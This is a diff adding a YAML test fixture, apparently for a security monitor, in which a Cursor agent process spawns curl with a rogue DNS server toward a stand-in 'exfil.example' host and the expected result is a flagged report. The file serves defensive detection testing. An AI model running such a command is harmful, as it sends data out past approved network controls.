@@ -1,0 +1,24 @@
+subjects:
+  cursor:
+    session: pid/100:1
+    program: /Applications/Cursor.app/Contents/MacOS/Cursor
+    agent: true
+    actors: [{id: u1, name: Dev, email: dev@example.com}]
+    device: dev-1
+    source: probe
+  curl:
+    session: pid/101:1
+    parent: cursor
+    program: /usr/bin/curl
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+observations:
+  - {kind: session_start, subject: cursor}
+  - {kind: spawn, subject: curl, cmdline: "curl --dns-servers 45.33.32.156 https://exfil.example/"}
+  - {kind: connect, subject: curl, host: 45.33.32.156, port: 53, protocol: udp}
+expect:
+  action: report
+  reason_contains: "non-approved nameserver 45.33.32.156"
+  output_contains: ["DNS port 53 to non-approved resolver 45.33.32.156 proto=udp agent=/usr/bin/curl"]
+  chain_min: 1
